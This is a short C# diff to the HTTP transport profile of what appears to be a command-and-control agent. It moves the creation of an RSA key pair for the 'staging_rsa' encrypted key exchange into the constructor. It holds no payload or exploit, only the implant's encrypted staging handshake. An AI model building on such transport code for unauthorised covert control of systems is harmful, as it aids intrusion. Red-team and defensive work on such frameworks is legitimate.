@@ -34,6 +34,7 @@ namespace HttpTransport
         private string ProxyAddress;
         private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
         private bool _uuidNegotiated = false;
+        private RSAKeyGenerator rsa = null;
 
         public HttpProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
@@ -45,6 +46,7 @@ namespace HttpTransport
             EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
             ProxyHost = data["proxy_host"];
             ProxyPort = data["proxy_port"];
+            rsa = agent.GetApi().NewRSAKeyPair(4096);
             if (!string.IsNullOrEmpty(ProxyPort))
             {
                 ProxyAddress = string.Format("{0}:{1}", ProxyHost, ProxyPort);
@@ -194,18 +196,16 @@ namespace HttpTransport
         {
             if (EncryptedExchangeCheck && !_uuidNegotiated)
             {
-                var rsa = Agent.GetApi().NewRSAKeyPair(4096);
-
                 EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                 {
                     Action = "staging_rsa",
-                    PublicKey = rsa.ExportPublicKey(),
-                    SessionID = rsa.SessionId
+                    PublicKey = this.rsa.ExportPublicKey(),
+                    SessionID = this.rsa.SessionId
                 };
 
                 if (!SendRecv<EKEHandshakeMessage, EKEHandshakeResponse>(handshake1, delegate(EKEHandshakeResponse respHandshake)
                 {
-                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
+                    byte[] tmpKey = this.rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                     ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                     ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                     return true;
